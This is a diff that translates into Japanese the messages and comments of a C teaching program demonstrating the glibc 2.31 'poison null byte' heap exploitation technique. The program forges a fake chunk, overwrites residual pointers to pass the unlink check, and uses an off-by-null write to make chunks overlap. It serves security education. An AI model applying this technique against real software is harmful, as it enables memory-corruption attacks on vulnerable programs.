@@ -8,51 +8,51 @@ int main()
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
 
-	puts("Welcome to poison null byte!");
-	puts("Tested in Ubuntu 20.04 64bit.");
-	puts("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.");
+	puts("poison null byte へようこそ!");
+	puts("Ubuntu 20.04 64bit でテストしています。");
+	puts("この技法は、malloc された領域に対して、ヌルバイトによる off-by-one(1 バイトのずれ)がある場合に使えます。");
 
-	puts("Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n");
+	puts("実装の詳細の一部は https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c から借りています\n");
 
-	// step0: force the allocation of tcache metadata to prevent it from messing with us
+	// step0: tcache のメタデータの確保を強制して、邪魔されないようにします
 	free(malloc(0x30));
 
-	// step1: allocate padding
-	puts("Step1: allocate a large padding so that the fake chunk's addresses's lowest 2nd byte is \\x00");
+	// step1: パディングを確保します
+	puts("Step1: 偽のチャンクのアドレスの下位 2 バイト目が \\x00 になるよう、大きなパディングを確保します");
 	void *tmp = malloc(0x1);
 	void *heap_base = (void *)((long)tmp & (~0xfff));
-	printf("heap address: %p\n", heap_base);
+	printf("ヒープのアドレス: %p\n", heap_base);
 	size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
-	printf("Calculate padding chunk size: 0x%lx\n", size);
-	puts("Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.");
+	printf("パディング用チャンクのサイズを計算します: 0x%lx\n", size);
+	puts("パディングを確保します。下位 2 バイトを上書きするため、4 ビットのブルートフォース(bruteforce)を避けるのに必要です。");
 	void *padding= malloc(size);
 
-	// step2: allocate prev chunk and victim chunk
-	puts("\nStep2: allocate two chunks adjacent to each other.");
-	puts("Let's call the first one 'prev' and the second one 'victim'.");
+	// step2: prev チャンクと victim チャンクを確保します
+	puts("\nStep2: 互いに隣接する 2 つのチャンクを確保します。");
+	puts("1 つ目を 'prev'、2 つ目を 'victim' と呼びましょう。");
 	void *prev = malloc(0x500);
 	void *victim = malloc(0x4f0);
-	puts("malloc(0x10) to avoid consolidation");
+	puts("統合(consolidation)を避けるために malloc(0x10) します");
 	malloc(0x10);
-	printf("prev chunk: malloc(0x500) = %p\n", prev);
-	printf("victim chunk: malloc(0x4f0) = %p\n", victim);
+	printf("prev チャンク: malloc(0x500) = %p\n", prev);
+	printf("victim チャンク: malloc(0x4f0) = %p\n", victim);
 
-	// step3: link prev into largebin
-	puts("\nStep3: Link prev into largebin");
-	puts("This step is necessary for us to forge a fake chunk later");
-	puts("The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk");
-	puts("allocate a chunk 'a' with size a little bit smaller than prev's");
+	// step3: prev を largebin にリンクします
+	puts("\nStep3: prev を largebin にリンクします");
+	puts("この手順は、後で偽のチャンクを偽造するために必要です");
+	puts("prev の fd_nextsize と bk_nextsize が、偽のチャンクの fd ポインタと bck ポインタになります");
+	puts("prev よりサイズが少し小さいチャンク 'a' を確保します");
 	void *a = malloc(0x4f0);
 	printf("a: malloc(0x4f0) = %p\n", a);
-	puts("malloc(0x10) to avoid consolidation");
+	puts("統合(consolidation)を避けるために malloc(0x10) します");
 	malloc(0x10);
-	puts("allocate a chunk 'b' with size a little bit larger than prev's");
+	puts("prev よりサイズが少し大きいチャンク 'b' を確保します");
 	void *b = malloc(0x510);
 	printf("b: malloc(0x510) = %p\n", b);
-	puts("malloc(0x10) to avoid consolidation");
+	puts("統合(consolidation)を避けるために malloc(0x10) します");
 	malloc(0x10);
 
-	puts("\nCurrent Heap Layout\n"
+	puts("\n現在のヒープレイアウト\n"
 		 "    ... ...\n"
 		 "padding\n"
 		 "    prev Chunk(addr=0x??0010, size=0x510)\n"
@@ -63,102 +63,102 @@ int main()
 		 "       b Chunk(addr=0x??0f60, size=0x520)\n"
 		 " barrier Chunk(addr=0x??1480, size=0x20)\n");
 
-	puts("Now free a, b, prev");
+	puts("ここで a、b、prev を解放します");
 	free(a);
 	free(b);
 	free(prev);
-	puts("current unsorted_bin:  header <-> [prev, size=0x510] <-> [b, size=0x520] <-> [a, size=0x500]\n");
+	puts("現在の unsorted_bin:  header <-> [prev, size=0x510] <-> [b, size=0x520] <-> [a, size=0x500]\n");
 
-	puts("Allocate a huge chunk to enable sorting");
+	puts("ソートを有効にするため、巨大なチャンクを確保します");
 	malloc(0x1000);
-	puts("current large_bin:  header <-> [b, size=0x520] <-> [prev, size=0x510] <-> [a, size=0x500]\n");
+	puts("現在の large_bin:  header <-> [b, size=0x520] <-> [prev, size=0x510] <-> [a, size=0x500]\n");
 
-	puts("This will add a, b and prev to largebin\nNow prev is in largebin");
-	printf("The fd_nextsize of prev points to a: %p\n", ((void **)prev)[2]+0x10);
-	printf("The bk_nextsize of prev points to b: %p\n", ((void **)prev)[3]+0x10);
+	puts("これにより a、b、prev が largebin に追加されます\nこれで prev は largebin にあります");
+	printf("prev の fd_nextsize は a を指しています: %p\n", ((void **)prev)[2]+0x10);
+	printf("prev の bk_nextsize は b を指しています: %p\n", ((void **)prev)[3]+0x10);
 
-	// step4: allocate prev again to construct fake chunk
-	puts("\nStep4: Allocate prev again to construct the fake chunk");
-	puts("Since large chunk is sorted by size and a's size is smaller than prev's,");
-	puts("we can allocate 0x500 as before to take prev out");
+	// step4: prev を再度確保して、偽のチャンクを構築します
+	puts("\nStep4: prev を再度確保して、偽のチャンクを構築します");
+	puts("large chunk はサイズ順にソートされており、a のサイズは prev より小さいので、");
+	puts("以前と同様に 0x500 を確保して prev を取り出せます");
 	void *prev2 = malloc(0x500);
 	printf("prev2: malloc(0x500) = %p\n", prev2);
-	puts("Now prev2 == prev, prev2->fd == prev2->fd_nextsize == a, and prev2->bk == prev2->bk_nextsize == b");
+	puts("これで prev2 == prev となり、prev2->fd == prev2->fd_nextsize == a、prev2->bk == prev2->bk_nextsize == b となります");
 	assert(prev == prev2);
 
-	puts("The fake chunk is contained in prev and the size is smaller than prev's size by 0x10");
-	puts("So set its size to 0x501 (0x510-0x10 | flag)");
+	puts("偽のチャンクは prev に含まれ、そのサイズは prev のサイズより 0x10 小さくなります");
+	puts("そのため、サイズを 0x501 (0x510-0x10 | フラグ) に設定します");
 	((long *)prev)[1] = 0x501;
-	puts("And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check");
+	puts("さらに、size==prev_size(next_chunk) のチェックを回避するため、その prev_size(next_chunk) を 0x500 に設定します");
 	*(long *)(prev + 0x500) = 0x500;
-	printf("The fake chunk should be at: %p\n", prev + 0x10);
-	puts("use prev's fd_nextsize & bk_nextsize as fake_chunk's fd & bk");
-	puts("Now we have fake_chunk->fd == a and fake_chunk->bk == b");
+	printf("偽のチャンクは次の位置にあるはずです: %p\n", prev + 0x10);
+	puts("prev の fd_nextsize と bk_nextsize を fake_chunk の fd と bk として使います");
+	puts("これで fake_chunk->fd == a、fake_chunk->bk == b となりました");
 
-	// step5: bypass unlinking
-	puts("\nStep5: Manipulate residual pointers to bypass unlinking later.");
-	puts("Take b out first by allocating 0x510");
+	// step5: unlink を回避します
+	puts("\nStep5: 残存ポインタを操作して、後の unlink を回避します。");
+	puts("まず 0x510 を確保して b を取り出します");
 	void *b2 = malloc(0x510);
-	printf("Because of the residual pointers in b, b->fd points to a right now: %p\n", ((void **)b2)[0]+0x10);
-	printf("We can overwrite the least significant two bytes to make it our fake chunk.\n"
-			"If the lowest 2nd byte is not \\x00, we need to guess what to write now\n");
+	printf("b に残存ポインタがあるため、現時点で b->fd は a を指しています: %p\n", ((void **)b2)[0]+0x10);
+	printf("下位 2 バイトを上書きして、これを偽のチャンクにできます。\n"
+			"下位 2 バイト目が \\x00 でない場合は、今ここで何を書くかを推測する必要があります\n");
 	((char*)b2)[0] = '\x10';
 	((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk
-	printf("After the overwrite, b->fd is: %p, which is the chunk pointer to our fake chunk\n", ((void **)b2)[0]);
+	printf("上書き後、b->fd は %p で、これは偽のチャンクへのチャンクポインタです\n", ((void **)b2)[0]);
 
-	puts("To do the same to a, we can move it to unsorted bin first"
-			"by taking it out from largebin and free it into unsortedbin");
+	puts("a にも同じことをするため、まず a を unsorted bin に移します。"
+			"largebin から取り出して、unsortedbin に解放します");
 	void *a2 = malloc(0x4f0);
 	free(a2);
-	puts("Now free victim into unsortedbin so that a->bck points to victim");
+	puts("ここで victim を unsortedbin に解放し、a->bck が victim を指すようにします");
 	free(victim);
-	printf("a->bck: %p, victim: %p\n", ((void **)a)[1], victim);
-	puts("Again, we take a out and overwrite a->bck to fake chunk");
+	printf("a->bck: %p、victim: %p\n", ((void **)a)[1], victim);
+	puts("再び a を取り出して、a->bck を偽のチャンクに上書きします");
 	void *a3 = malloc(0x4f0);
 	((char*)a3)[8] = '\x10';
 	((char*)a3)[9] = '\x00';
-	printf("After the overwrite, a->bck is: %p, which is the chunk pointer to our fake chunk\n", ((void **)a3)[1]);
-	// pass unlink_chunk in malloc.c:
+	printf("上書き後、a->bck は %p で、これは偽のチャンクへのチャンクポインタです\n", ((void **)a3)[1]);
+	// malloc.c の unlink_chunk を通過します:
 	//      mchunkptr fd = p->fd;
 	//      mchunkptr bk = p->bk;
 	//      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
 	//          malloc_printerr ("corrupted double-linked list");
-	puts("And we have:\n"
+	puts("これで次のようになります:\n"
 		 "fake_chunk->fd->bk == a->bk == fake_chunk\n"
 		 "fake_chunk->bk->fd == b->fd == fake_chunk\n"
 		 );
 
-	// step6: add fake chunk into unsorted bin by off-by-null
-	puts("\nStep6: Use backward consolidation to add fake chunk into unsortedbin");
-	puts("Take victim out from unsortedbin");
+	// step6: off-by-null で偽のチャンクを unsorted bin に追加します
+	puts("\nStep6: 後方への統合(backward consolidation)を使って、偽のチャンクを unsortedbin に追加します");
+	puts("victim を unsortedbin から取り出します");
 	void *victim2 = malloc(0x4f0);
 	printf("%p\n", victim2);
-	puts("off-by-null into the size of vicim");
+	puts("victim のサイズに off-by-null を行います");
 	/* VULNERABILITY */
 	((char *)victim2)[-8] = '\x00';
 	/* VULNERABILITY */
 
-	puts("Now if we free victim, libc will think the fake chunk is a free chunk above victim\n"
-			"It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n"
-			"add the merged chunk into unsortedbin."
+	puts("ここで victim を解放すると、libc は偽のチャンクを victim の上にある解放済みチャンクだと思い込みます\n"
+			"そして偽のチャンクを unlink して、victim を偽のチャンクと後方に統合しようとし、\n"
+			"統合したチャンクを unsortedbin に追加します。"
 			);
-	printf("For our fake chunk, because of what we did in step4,\n"
-			"now P->fd->bk(%p) == P(%p), P->bk->fd(%p) == P(%p)\n"
-			"so the unlink will succeed\n", ((void **)a3)[1], prev, ((void **)b2)[0], prev);
+	printf("偽のチャンクについては、step4 で行ったことにより、\n"
+			"現在 P->fd->bk(%p) == P(%p)、P->bk->fd(%p) == P(%p) となっているので、\n"
+			"unlink は成功します\n", ((void **)a3)[1], prev, ((void **)b2)[0], prev);
 	free(victim);
-	puts("After freeing the victim, the new merged chunk is added to unsorted bin"
-			"And it is overlapped with the prev chunk");
+	puts("victim を解放すると、新たに統合されたチャンクが unsorted bin に追加されます。"
+			"そしてそれは prev チャンクと重なっています");
 
-	// step7: validate the chunk overlapping
-	puts("Now let's validate the chunk overlapping");
+	// step7: chunk overlapping を検証します
+	puts("それでは chunk overlapping を検証しましょう");
 	void *merged = malloc(0x100);
 	printf("merged: malloc(0x100) = %p\n", merged);
 	memset(merged, 'A', 0x80);
-	printf("Now merged's content: %s\n", (char *)merged);
+	printf("現在の merged の内容: %s\n", (char *)merged);
 
-	puts("Overwrite prev's content");
+	puts("prev の内容を上書きします");
 	memset(prev2, 'C', 0x80);
-	printf("merged's content has changed to: %s\n", (char *)merged);
+	printf("merged の内容が次のように変わりました: %s\n", (char *)merged);
 
 	assert(strstr(merged, "CCCCCCCCC"));
 }
